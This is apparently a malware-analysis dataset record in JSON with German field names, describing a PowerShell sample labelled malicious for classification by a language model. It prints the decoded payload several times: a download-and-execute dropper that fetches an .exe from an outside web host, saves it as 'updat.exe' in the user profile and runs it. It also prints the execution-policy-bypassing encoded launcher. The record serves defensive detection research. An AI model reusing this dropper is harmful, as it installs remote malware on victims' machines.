@@ -1,0 +1,63 @@
+{
+  "meta": {
+    "quelldatei": "026ccb13ef7903f6cb39a85357181a613588b7118ea61b3580152aca02879638.ps1",
+    "sha256": "026ccb13ef7903f6cb39a85357181a613588b7118ea61b3580152aca02879638",
+    "groesse_bytes": 792,
+    "zeilen": 1,
+    "ground_truth_label": "malicious",
+    "analyse_gekuerzt": false,
+    "hinweis": "Kein Urteil enthalten. Bewertung erfolgt durch das LLM."
+  },
+  "stufe1_extract": {
+    "strings": [],
+    "string_anzahl_gesamt": 0,
+    "base64_bloecke_dekodiert": [
+      {
+        "laenge": 696,
+        "dekodiert": "[Net.ServIcePOiNtmanageR]::sEcURitYPROToCol = \t[net.SeCuRItYPrOtocoLtypE]::Tls12  ;   Irm \t-Uri \t(”http://ozzyingilizce.com/wp-content/sgu/0”  + ”26130784100001.ex”  + ”e” ) \t-OuTFilE ”$ENV:USerPROfilE\\updat.exe” \t;  InvOKe-iTem  ”$EnV:userProfIlE\\updat.exe”"
+      }
+    ],
+    "base64_bloecke_gesamt": 1
+  },
+  "stufe2_features": {
+    "strings": [],
+    "string_anzahl_gesamt": 0,
+    "base64_bloecke_dekodiert": [
+      {
+        "laenge": 696,
+        "dekodiert": "[Net.ServIcePOiNtmanageR]::sEcURitYPROToCol = \t[net.SeCuRItYPrOtocoLtypE]::Tls12  ;   Irm \t-Uri \t(”http://ozzyingilizce.com/wp-content/sgu/0”  + ”26130784100001.ex”  + ”e” ) \t-OuTFilE ”$ENV:USerPROfilE\\updat.exe” \t;  InvOKe-iTem  ”$EnV:userProfIlE\\updat.exe”"
+      }
+    ],
+    "base64_bloecke_gesamt": 1,
+    "beobachtete_cmdlets": [],
+    "auffaellige_tokens": {},
+    "iocs": {
+      "urls": [],
+      "ipv4": [],
+      "pfade": []
+    }
+  },
+  "stufe3_structure": {
+    "strings": [],
+    "string_anzahl_gesamt": 0,
+    "base64_bloecke_dekodiert": [
+      {
+        "laenge": 696,
+        "dekodiert": "[Net.ServIcePOiNtmanageR]::sEcURitYPROToCol = \t[net.SeCuRItYPrOtocoLtypE]::Tls12  ;   Irm \t-Uri \t(”http://ozzyingilizce.com/wp-content/sgu/0”  + ”26130784100001.ex”  + ”e” ) \t-OuTFilE ”$ENV:USerPROfilE\\updat.exe” \t;  InvOKe-iTem  ”$EnV:userProfIlE\\updat.exe”"
+      }
+    ],
+    "base64_bloecke_gesamt": 1,
+    "beobachtete_cmdlets": [],
+    "auffaellige_tokens": {},
+    "iocs": {
+      "urls": [],
+      "ipv4": [],
+      "pfade": []
+    },
+    "deobfuskiert_auszug": " SeT-execuTIOnpolICY BypaSs -scOPe pROcesS -FOrcE ; POWERSHEll.eXE \t-EX bYpAsS \t-NOp -W 1 \t-ec IAAJAFsATgBlAHQALgBTAGUAcgB2AEkAYwBlAFAATwBpAE4AdABtAGEAbgBhAGcAZQBSAF0AOgA6AHMARQBjAFUAUgBpAHQAWQBQAFIATwBUAG8AQwBvAGwAIAA9ACAACQBbAG4AZQB0AC4AUwBlAEMAdQBSAEkAdABZAFAAcgBPAHQAbwBjAG8ATAB0AHkAcABFAF0AOgA6AFQAbABzADEAMgAgACAAOwAgACAAIABJAHIAbQAgAAkALQBVAHIAaQAgAAkAKAAdIGgAdAB0AHAAOgAvAC8AbwB6AHoAeQBpAG4AZwBpAGwAaQB6AGMAZQAuAGMAbwBtAC8AdwBwAC0AYwBvAG4AdABlAG4AdAAvAHMAZwB1AC8AMAAdICAAIAArACAAHSAyADYAMQAzADAANwA4ADQAMQAwADAAMAAwADEALgBlAHgAHSAgACAAKwAgAB0gZQAdICAAKQAgAAkALQBPAHUAVABGAGkAbABFACAAHSAkAEUATgBWADoAVQBTAGUAcgBQAFIATwBmAGkAbABFAFwAdQBwAGQAYQB0AC4AZQB4AGUAHSAgAAkAOwAgACAASQBuAHYATwBLAGUALQBpAFQAZQBtACAAIAAdICQARQBuAFYAOgB1AHMAZQByAFAAcgBvAGYASQBsAEUAXAB1AHAAZABhAHQALgBlAHgAZQAdIA== ",
+    "dekodierte_befehle": [
+      "[Net.ServIcePOiNtmanageR]::sEcURitYPROToCol = \t[net.SeCuRItYPrOtocoLtypE]::Tls12  ;   Irm \t-Uri \t(”http://ozzyingilizce.com/wp-content/sgu/0”  + ”26130784100001.ex”  + ”e” ) \t-OuTFilE ”$ENV:USerPROfilE\\updat.exe” \t;  InvOKe-iTem  ”$EnV:userProfIlE\\updat.exe”"
+    ],
+    "beobachtete_abfolge": []
+  }
+}
